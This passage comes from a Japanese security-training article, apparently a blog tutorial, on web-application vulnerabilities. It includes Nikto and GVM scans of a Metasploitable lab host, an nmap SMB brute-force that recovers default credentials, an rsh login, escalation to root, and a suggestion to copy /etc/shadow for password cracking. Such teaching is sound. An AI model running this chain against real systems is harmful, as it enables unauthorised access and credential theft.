class=\"s2\">\"https://typo3.org/\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/phpMyAdmin/README\"</span>,<span class=\"s2\">\"phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\"</span>\n<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"172.17.0.2\"</span>,<span class=\"s2\">\"80\"</span>,<span class=\"s2\">\"\"</span>,<span class=\"s2\">\"GET\"</span>,<span class=\"s2\">\"/#wp-config.php#\"</span>,<span class=\"s2\">\"#wp-config.php# file found. This file contains the credentials.\"</span>\n</code></pre></div></div>\n<details><summary>実行時のログはこちら（クリックで展開）</summary>\n<div class=\"code-frame\" data-lang=\"shell-session\" data-sourcepos=\"326:1-368:3\"><div class=\"highlight\"><pre><code><span class=\"go\">┌──(kali㉿Kali)-[~]\n</span><span class=\"gp\">└─$</span><span class=\"w\"> </span>nikto <span class=\"nt\">-h</span> 172.17.0.2 <span class=\"nt\">-o</span> scan_results.txt <span class=\"nt\">-Format</span> csv\n<span class=\"go\">- Nikto v2.5.0\n---------------------------------------------------------------------------\n+ Target IP:          172.17.0.2\n+ Target Hostname:    172.17.0.2\n+ Target Port:        80\n+ Start Time:         2025-11-08 12:43:12 (GMT0)\n---------------------------------------------------------------------------\n+ Server: Apache/2.2.8 (Ubuntu) DAV/2\n+ /: Retrieved x-powered-by header: PHP/5.2.4-2ubuntu5.10.\n+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options\n+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/\n+ /index: Uncommon header 'tcn' found, with contents: list.\n+ /index: Apache mod_negotiation is enabled with MultiViews, which allows attackers to easily brute force file names. The following alternatives for 'index' were found: index.php. See: http://www.wisec.it/sectou.php?id=4698ebdc59d15,https://exchange.xforce.ibmcloud.com/vulnerabilities/8275\n+ Apache/2.2.8 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.\n+ /: Web Server returns a valid response with junk HTTP methods which may cause false positives.\n+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing\n+ /phpinfo.php: Output from the phpinfo() function was found.\n+ /doc/: Directory indexing found.\n+ /doc/: The /doc/ directory is browsable. This may be /usr/doc. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-1999-0678\n+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184\n+ /phpMyAdmin/changelog.php: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/ChangeLog: Server may leak inodes via ETags, header found with file /phpMyAdmin/ChangeLog, inode: 1115138, size: 40540, mtime: Tue Dec  9 17:24:00 2008. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418\n+ /phpMyAdmin/ChangeLog: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /test/: Directory indexing found.\n+ /test/: This might be interesting.\n+ /phpinfo.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information. See: CWE-552\n+ /icons/: Directory indexing found.\n+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/\n+ /phpMyAdmin/: phpMyAdmin directory found.\n+ /phpMyAdmin/Documentation.html: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts.\n+ /phpMyAdmin/README: phpMyAdmin is for managing MySQL databases, and should be protected or limited to authorized hosts. See: https://typo3.org/\n</span><span class=\"gp\">+ /#</span>wp-config.php#: <span class=\"c\">#wp-config.php# file found. This file contains the credentials.</span>\n<span class=\"go\">+ 8910 requests: 0 error(s) and 27 item(s) reported on remote host\n+ End Time:           2025-11-08 12:43:28 (GMT0) (16 seconds)\n---------------------------------------------------------------------------\n+ 1 host(s) tested\n</span></code></pre></div></div>\n</details>\n<h3 data-sourcepos=\"372:1-372:51\">\n<span id=\"参考nikto以外の脆弱性スキャナー\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83nikto%E4%BB%A5%E5%A4%96%E3%81%AE%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%8A%E3%83%BC\"><i class=\"fa fa-link\"></i></a>参考：Nikto以外の脆弱性スキャナー</h3>\n<ul data-sourcepos=\"373:1-382:0\">\n<li data-sourcepos=\"373:1-375:14\">商用向け（有償）\n<ul data-sourcepos=\"374:5-375:14\">\n<li data-sourcepos=\"374:5-374:35\">nvicti / Netsparker (invicti)</li>\n<li data-sourcepos=\"375:5-375:14\">Acunetix</li>\n</ul>\n</li>\n<li data-sourcepos=\"376:1-378:10\">オープンソース\n<ul data-sourcepos=\"377:5-378:10\">\n<li data-sourcepos=\"377:5-377:15\">OWASP ZAP</li>\n<li data-sourcepos=\"378:5-378:10\">w3af</li>\n</ul>\n</li>\n<li data-sourcepos=\"379:1-382:0\">特化ツール\n<ul data-sourcepos=\"380:5-382:0\">\n<li data-sourcepos=\"380:5-380:27\">sqlmap：sqlに特化</li>\n<li data-sourcepos=\"381:5-382:0\">WPScan：WordPressに特化</li>\n</ul>\n</li>\n</ul>\n<h2 data-sourcepos=\"383:1-383:51\">\n<span id=\"実践演習gvm脆弱性スキャナの利用\" class=\"fragment\"></span><a href=\"#%E5%AE%9F%E8%B7%B5%E6%BC%94%E7%BF%92gvm%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%8A%E3%81%AE%E5%88%A9%E7%94%A8\"><i class=\"fa fa-link\"></i></a>実践演習：GVM脆弱性スキャナの利用</h2>\n<p data-sourcepos=\"384:1-385:81\">本演習では脆弱なホスト（172.17.0.2）に対して、<br>\n脆弱性スキャンを実行し、発見された脆弱性を悪用します。</p>\n<p data-sourcepos=\"387:1-387:105\">GVMのスキャン実行手順については以前扱ってますのでそちらをご覧ください。</p>\n<p data-sourcepos=\"389:1-389:234\"><iframe id=\"qiita-embed-content__a937811933ad9f4ae5da274457ec41de\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a937811933ad9f4ae5da274457ec41de\" data-content=\"https%3A%2F%2Fqiita.com%2Fdabide%2Fitems%2F67ac8910e7667751514d%23-%25E5%25AE%259F%25E8%25B7%25B5%25E6%25BC%2594%25E7%25BF%2592greenbone-vulnerability-managementgvm%25E3%2582%2592%25E4%25BD%25BF%25E7%2594%25A8%25E3%2581%2597%25E3%2581%259F%25E8%2584%2586%25E5%25BC%25B1%25E6%2580%25A7%25E3%2582%25B9%25E3%2582%25AD%25E3%2583%25A3%25E3%2583%25B3\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h3 data-sourcepos=\"391:1-391:37\">\n<span id=\"one-gvmでのスキャン実行\" class=\"fragment\"></span><a href=\"#one-gvm%E3%81%A7%E3%81%AE%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3%E5%AE%9F%E8%A1%8C\"><i class=\"fa fa-link\"></i></a><img alt=\":one:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/31-fe0f-20e3.png\" title=\":one:\" width=\"20\" loading=\"lazy\"> GVMでのスキャン実行</h3>\n<p data-sourcepos=\"392:1-393:74\">脆弱なホストに対して詳細タスクウィザードを選択し「Metaspoloitable」というタスク名を付けて実行します。<br>\n※スキャンがかなり時間を要し、30分以上かかります。</p>\n<p data-sourcepos=\"395:1-396:122\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F3fe254dc-715e-4c37-b2b0-f63ea7bf3873.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=207a35b85c9166a5de2acc2025d48b9a\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F3fe254dc-715e-4c37-b2b0-f63ea7bf3873.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=207a35b85c9166a5de2acc2025d48b9a\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F3fe254dc-715e-4c37-b2b0-f63ea7bf3873.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=ad797d8a113877cfafb28a5f5c113fd4 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/3fe254dc-715e-4c37-b2b0-f63ea7bf3873.png\" loading=\"lazy\"></a><br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fb6d87399-2beb-4eda-b2d9-77705bd2c67b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2aa265b169c605434cd82697167e744b\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fb6d87399-2beb-4eda-b2d9-77705bd2c67b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=2aa265b169c605434cd82697167e744b\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fb6d87399-2beb-4eda-b2d9-77705bd2c67b.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=971ecfc49b795070e4c94f2b514a72a6 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/b6d87399-2beb-4eda-b2d9-77705bd2c67b.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"398:1-398:37\">\n<span id=\"two-スキャン結果の確認\" class=\"fragment\"></span><a href=\"#two-%E3%82%B9%E3%82%AD%E3%83%A3%E3%83%B3%E7%B5%90%E6%9E%9C%E3%81%AE%E7%A2%BA%E8%AA%8D\"><i class=\"fa fa-link\"></i></a><img alt=\":two:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/32-fe0f-20e3.png\" title=\":two:\" width=\"20\" loading=\"lazy\"> スキャン結果の確認</h3>\n<p data-sourcepos=\"399:1-402:122\">スキャン完了後にレポートを開きスキャン結果を確認します。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fc5bf6221-9e47-453e-919c-247c35f33894.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=33fdc62d24675faab61b930dcd871fd2\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fc5bf6221-9e47-453e-919c-247c35f33894.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=33fdc62d24675faab61b930dcd871fd2\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fc5bf6221-9e47-453e-919c-247c35f33894.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=14cd4d014f56fbf01ece0ce9fe3b1dae 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/c5bf6221-9e47-453e-919c-247c35f33894.png\" loading=\"lazy\"></a><br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F34b29f2b-7117-45f3-971c-b8ef7596d187.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=28758dd7350819e9b84eaba90ea5d2d7\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F34b29f2b-7117-45f3-971c-b8ef7596d187.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=28758dd7350819e9b84eaba90ea5d2d7\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F34b29f2b-7117-45f3-971c-b8ef7596d187.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=abd674f46af59f2d4313d62f90d30ea8 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/34b29f2b-7117-45f3-971c-b8ef7596d187.png\" loading=\"lazy\"></a><br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fc2de7f29-1a0f-4233-bbac-b9834e27fbcc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a55ebd4586a7ddbc4186d6330d90b073\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fc2de7f29-1a0f-4233-bbac-b9834e27fbcc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=a55ebd4586a7ddbc4186d6330d90b073\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2Fc2de7f29-1a0f-4233-bbac-b9834e27fbcc.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=237fa41132f596ae479826e0a27d4f6c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/c2de7f29-1a0f-4233-bbac-b9834e27fbcc.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"404:1-405:122\">複数の脆弱性の内、「rexecサービスが実行中」という脆弱性について悪用します。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F36a62c03-f255-45e3-8d89-c2c111916342.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bf3838e221484e3474c0a565884afe96\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F36a62c03-f255-45e3-8d89-c2c111916342.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=bf3838e221484e3474c0a565884afe96\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F4177943%2F36a62c03-f255-45e3-8d89-c2c111916342.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=156926f6701f5ba93791df4e14c266b6 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/4177943/36a62c03-f255-45e3-8d89-c2c111916342.png\" loading=\"lazy\"></a></p>\n<h4 data-sourcepos=\"407:1-407:11\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h4>\n<p data-sourcepos=\"408:1-409:169\">対策やCVSSのスコア、脆弱性テストのスクリプトを含む脆弱性の詳細については、レポート内の脆弱性詳細のSolution や CVE の詳細ページを閲覧することで確認できます。<br>\n一つ前のスクリーンショットのSolutionの項から、rexecサービスの代わりにSSHを利用するのが対策の一つとして挙げられてます。</p>\n<h3 data-sourcepos=\"411:1-411:51\">\n<span id=\"three-発見した脆弱性を悪用する\" class=\"fragment\"></span><a href=\"#three-%E7%99%BA%E8%A6%8B%E3%81%97%E3%81%9F%E8%84%86%E5%BC%B1%E6%80%A7%E3%82%92%E6%82%AA%E7%94%A8%E3%81%99%E3%82%8B\"><i class=\"fa fa-link\"></i></a><img alt=\":three:\" class=\"emoji\" height=\"20\" src=\"https://cdn.qiita.com/emoji/twemoji/unicode/33-fe0f-20e3.png\" title=\":three:\" width=\"20\" loading=\"lazy\"> 発見した脆弱性を悪用する。</h3>\n<p data-sourcepos=\"412:1-413:48\">Nmapを利用し、rexecが使用できるアカウント情報をSMBから情報が得られるかを確認します。<br>\n※SMBの脆弱性確認は省略してます。</p>\n<p data-sourcepos=\"415:1-416:94\">OSのユーザー名とSMBのユーザー名を同期させることが多い点を考慮して、<br>\nNmap NSEスクリプトのうち'smb-burte'を利用してアカウントを調査します。</p>\n<div class=\"code-frame\" data-lang=\"shell-session\" data-sourcepos=\"417:1-435:3\"><div class=\"highlight\"><pre><code><span class=\"go\">┌──(kali㉿Kali)-[~]\n</span><span class=\"gp\">└─$</span><span class=\"w\"> </span><span class=\"nb\">sudo </span>nmap <span class=\"nt\">-sV</span> <span class=\"nt\">-p</span> 445 <span class=\"nt\">-script</span> smb-brute 172.17.0.2\n<span class=\"go\">Starting Nmap 7.94 ( https://nmap.org ) at 2025-11-08 13:59 UTC\nNmap scan report for metasploitable.vm (172.17.0.2)\nHost is up (0.000033s latency).\n\nPORT    STATE SERVICE     VERSION\n445/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)\nMAC Address: 02:42:AC:11:00:02 (Unknown)\n\nHost script results:\n| smb-brute: \n</span><span class=\"gp\">|   msfadmin:msfadmin =&gt;</span><span class=\"w\"> </span>Valid credentials\n<span class=\"gp\">|_  user:user =&gt;</span><span class=\"w\"> </span>Valid credentials\n<span class=\"go\">\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\nNmap done: 1 IP address (1 host up) scanned in 241.04 seconds\n</span></code></pre></div></div>\n<p data-sourcepos=\"437:1-438:68\">Host script resultsから2つのユーザーとパスワードが確認できます。<br>\nこれらを用いてrexecサービス（rsh）を実行します。</p>\n<div class=\"code-frame\" data-lang=\"shell-session\" data-sourcepos=\"440:1-461:3\"><div class=\"highlight\"><pre><code><span class=\"go\">┌──(kali㉿Kali)-[~]\n</span><span class=\"gp\">└─$</span><span class=\"w\"> </span>rsh <span class=\"nt\">-l</span> msfadmin 172.17.0.2                                                                         \n<span class=\"go\">Last login: Sun Jul 16 21:04:01 EDT 2017 on tty1\n</span><span class=\"gp\">Linux 32554753bfe5 4.13.0-21-generic #</span>24-Ubuntu SMP Mon Dec 18 17:29:16 UTC 2017 x86_64\n<span class=\"go\">\n</span><span class=\"gp\">The programs included with the Ubuntu system are free software;</span><span class=\"w\">\n</span><span class=\"go\">the exact distribution terms for each program are described in the\nindividual files in /usr/share/doc/*/copyright.\n\nUbuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by\napplicable law.\n\nTo access official Ubuntu documentation, please visit:\nhttp://help.ubuntu.com/\nNo mail.\n</span><span class=\"gp\">msfadmin@metasploitable:~$</span><span class=\"w\"> </span><span class=\"nb\">pwd</span>     \n<span class=\"go\">/home/msfadmin\n</span><span class=\"gp\">msfadmin@metasploitable:~$</span><span class=\"w\"> </span><span class=\"nb\">sudo </span>su\n<span class=\"go\">[sudo] password for msfadmin: \n</span><span class=\"gp\">root@metasploitable:/home/msfadmin#</span><span class=\"w\"> \n</span></code></pre></div></div>\n<p data-sourcepos=\"463:1-465:111\">特権ユーザへの昇格まで成功しています。<br>\nこの後 /etc/passwd および /etc/shadow ファイルをコピーしJohn the Ripperユーティリティなどを用いてパスワード解析することで、次の攻撃へと連鎖すること容易に想像できると思います。<br>\n※パスワードクラックに関しては6.5章「認証ベースの脆弱性の悪用」で扱います。</p>\n<hr data-sourcepos=\"467:1-468:0\">\n<h2 data-sourcepos=\"469:1-469:50\">\n<span id=\"62-独自のwebアプリラボの構築方法\" class=\"fragment\"></span><a href=\"#62-%E7%8B%AC%E8%87%AA%E3%81%AEweb%E3%82%A2%E3%83%97%E3%83%AA%E3%83%A9%E3%83%9C%E3%81%AE%E6%A7%8B%E7%AF%89%E6%96%B9%E6%B3%95\"><i class=\"fa fa-link\"></i></a>6.2. 独自のWebアプリラボの構築方法</h2>\n<h3 data-sourcepos=\"471:1-471:29\">\n<span id=\"-ラボ環境の目的\" class=\"fragment\"></span><a href=\"#-%E3%83%A9%E3%83%9C%E7%92%B0%E5%A2%83%E3%81%AE%E7%9B%AE%E7%9A%84\"><i class=\"fa fa-link\"></i></a>● ラボ環境の目的</h3>\n<ul data-sourcepos=\"473:1-475:0\">\n<li data-sourcepos=\"473:1-473:50\">Webアプリ脆弱性を安全に理解・検証</li>\n<li data-sourcepos=\"474:1-475:0\">インジェクションや認証欠陥を実習可能</li>\n</ul>\n<h3 data-sourcepos=\"476:1-476:61\">\n<span id=\"-おすすめのlinuxディストリビューション\" class=\"fragment\"></span><a href=\"#-%E3%81%8A%E3%81%99%E3%81%99%E3%82%81%E3%81%AElinux%E3%83%87%E3%82%A3%E3%82%B9%E3%83%88%E3%83%AA%E3%83%93%E3%83%A5%E3%83%BC%E3%82%B7%E3%83%A7%E3%83%B3\"><i class=\"fa fa-link\"></i></a>● おすすめのLinuxディストリビューション</h3>\n<p data-sourcepos=\"477:1-477:66\">下記を利用した環境構築が手軽でおすすめです。</p>\n<p data-sourcepos=\"479:1-481:128\"><a href=\"https://www.kali.org\" rel=\"nofollow noopener\" target=\"_blank\">Kali Linux</a>：本記事でも利用している最も人気なディストリビューション<br>\n<a href=\"https://www.parrotsec.org\" rel=\"nofollow noopener\" target=\"_blank\">Parrot OS</a>：ペンテスターや研究者に人気なディストリビューション<br>\n<a href=\"https://blackarch.org\" rel=\"nofollow noopener\" target=\"_blank\">BlackArch Linux</a>：1900以上のツールパッケージが付属するディストリビューション</p>\n<hr data-sourcepos=\"483:1-484:0\">\n<h2 data-sourcepos=\"485:1-485:49\">\n<span id=\"63-ビジネスロジックの欠陥の理解\" class=\"fragment\"></span><a href=\"#63-%E3%83%93%E3%82%B8%E3%83%8D%E3%82%B9%E3%83%AD%E3%82%B8%E3%83%83%E3%82%AF%E3%81%AE%E6%AC%A0%E9%99%A5%E3%81%AE%E7%90%86%E8%A7%A3\"><i class=\"fa fa-link\"></i></a>6.3 ビジネスロジックの欠陥の理解</h2>\n<p data-sourcepos=\"487:1-488:87\">ビジネスロジックの欠陥とは設計上の欠陥のこと。<br>\n脆弱性スキャナでは検知ができないため独自の対策が必要です。</p>\n<ul data-sourcepos=\"490:1-493:0\">\n<li data-sourcepos=\"490:1-490:61\">例: 課金ロジックやポイント加算の不正操作</li>\n<li data-sourcepos=\"491:1-491:52\">対策: 入力検証と処理フローの厳格化</li>\n<li data-sourcepos=\"492:1-493:0\">OWASPが推奨する欠陥に対する攻撃テスト及び防御方法は<a href=\"https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/10-Business_Logic_Testing/01-Test_Business_Logic_Data_Validation\" rel=\"nofollow noopener\" target=\"_blank\">こちら</a>\n</li>\n</ul>\n<hr data-sourcepos=\"494:1-495:0\">\n<h2 data-sourcepos=\"496:1-496:21\">\n<span id=\"本章のまとめ\" class=\"fragment\"></span><a href=\"#%E6%9C%AC%E7%AB%A0%E3%81%AE%E3%81%BE%E3%81%A8%E3%82%81\"><i class=\"fa fa-link\"></i></a>本章のまとめ</h2>\n<p data-sourcepos=\"498:1-498:280\">本章ではWebアプリケーションの脆弱性を体系的に整理し、<strong>HTTP/HTTPSプロトコル理解 → OWASP Top 10 → ラボ環境での演習 → 独自のWebアプリラボの構築方法 → ビジネスロジックの欠陥の理解</strong>までを扱いました。</p>\n<ul data-sourcepos=\"500:1-502:0\">\n<li data-sourcepos=\"500:1-500:101\">セッション管理や認証処理の欠陥、入力検証の不備が攻撃成立に直結する</li>\n<li data-sourcepos=\"501:1-502:0\">OWASP Top 10を理解し、防御策を検討することがセキュリティ専門家の基本</li>\n</ul>\n<hr data-sourcepos=\"503:1-504:0\">\n<p data-sourcepos=\"505:1-506:92\">📍 <strong>次回予告</strong><br>\n次回は「6.4 インジェクション攻撃」以降の6章の内容を解説します。</p>\n<hr data-sourcepos=\"508:1-508:3\">\n",
      "body": "---\n\n# 導入\n\n本記事は以下の続編として、Webアプリケーションにおける脆弱性評価と演習を扱います。\n\nhttps://qiita.com/dabide/items/bbb85cddc574e0517723\n\n---\n\n\n## この記事で得られること\n\n* HTTP/HTTPSの基本構造と通信の流れ\n* Webアプリケーションの脆弱性とOWASP Top 10\n* ハンズオンに基づく脆弱性スキャンおよび検証方法\n* 独自 Web アプリラボの構築と典型的な設計ミスの理解\n\n---\n\n# ⚠️ 注意（必読）\n\n> 本記事で扱う内容は、悪用した場合、重大な法的リスクを伴います。\n> 許可された演習環境・検証環境でのみ実施してください。\n> 実在組織・個人への攻撃は禁止されています。\n\n---\n\n## 本章について\n6章ではアプリケーションベースの脆弱性の悪用を解説しますが、\n内容が広範なため複数の記事に分割いたします。\n\n以下が6章全体の構成です。\n\n* 6.1. Webアプリケーションベースの攻撃の概要とOWASPトップ10👈本記事\n* 6.2. 独自のWebアプリラボの構築方法👈本記事\n* 6.3. ビジネスロジックの欠陥の理解👈本記事\n* 6.4. インジェクションベースの脆弱性理解\n* 6.5. 認証ベースの脆弱性悪用\n* 6.6. クロスサイトスクリプティング（XSS）の脆弱性理解\n* 6.7. クロスサイトリクエストフォージェリ（CSRF/XSRF）とサーバーサイトリクエストフォージェリ攻撃の概要\n* 6.8. クリックジャッキングの概要\n* 6.9. ファイルインクルード脆弱性の悪用\n* 6.10. 安全でないコードの悪用\n\n\n---\n## 6.1 Webアプリケーション攻撃の概要とOWASP Top 10\n\n### ● HTTP/HTTPSプロトコルの基礎\n\nHTTPは**ステートレスなアプリケーションレベルプロトコル**で、リクエスト/レスポンスモデルを採用しています。\n\n* **クライアント**: ブラウザ、APIクライアント、カスタムHTTPプログラム\n* **サーバー**: Webサーバー（例: Apache, Nginx）\n* **特徴**: 単純で理解しやすいが、ステートレスであるためセッション管理をアプリケーション側で行う必要がある\n\nHTTPトランザクションの流れ:\n\n1.TCP 3-way ハンドシェイク\n2.HTTP GET / POST リクエスト送信\n3.サーバーが HTTP レスポンス（例：200 OK）を返却\n\n代表的なHTTPメソッド:\n\n| メソッド    | 説明                  |\n| ------- | ------------------- |\n| GET     | リソース取得              |\n| POST    | データ送信               |\n| PUT     | リソース更新              |\n| DELETE  | リソース削除              |\n| OPTIONS | サーバーがサポートするメソッド一覧取得 |\n| CONNECT | HTTPプロキシに対し任意ホストへのTCPトンネルを要求 |\n\nHTTPリクエスト構造に含まれる要素：\n* HTTPメソッド\n* URIとリソースへのパス － 要求されたURLのパス部分\n* リクエストバージョン番号 － クライアントが使用するHTTPのバージョン\n* ユーザーエージェント － ユーザーが使用するブラウザなどのエージェント情報\nなど\n\nURL構造の例:\n\n```\nhttps://theartofhacking.org:8123/dir/test;id=89?name=omar&x=true\n```\n\n* スキーム: https\n* ホスト: theartofhacking.org\n* ポート: 8123\n* パス: /dir/test\n* パスパラメータ: id=89\n* クエリ文字列: name=omar&x=true\n\n---\n\n### ● Webセッションとセッション管理\n\nWebセッションは、**HTTPリクエストとレスポンスの一連のやり取り**を通じてユーザー状態を管理します。\n\n* **セッションIDの役割**: 認証後、パスワード並みに機密性を持つ識別子\n    * **推奨**: 128ビット以上、できれば256ビットのエントロピーを持つセッションID\n    * **セッション管理手段**: Cookie（推奨）※、URLパラメータ（非推奨）、隠しフォームフィールド\n※Cookieにも永続（Persient Cookie）と非永続（Session Cookie）の２種類存在し、Session Cookieによる管理を推奨\n* **セッション管理におけるその他の推奨事項**: \n    * TLSによる暗号化\n    * 既存フレームワークの利用\n    * セッションIDの検証・バリデーションの徹底\n---\n\n### ● OWASP Top 10\n\nOWASP（Open Web Application Security Project）が公開する**Webアプリケーションの重大な脆弱性トップ10**。\n最新情報: [OWASP Top 10](https://owasp.org/Top10/2025/)\n\n2025年のTOP10\n\n1. Broken Access Control\n1. Security Misconfiguration\n1. Software Supply Chain Failures\n1. Cryptographic Failures\n1. Injection\n1. Insecure 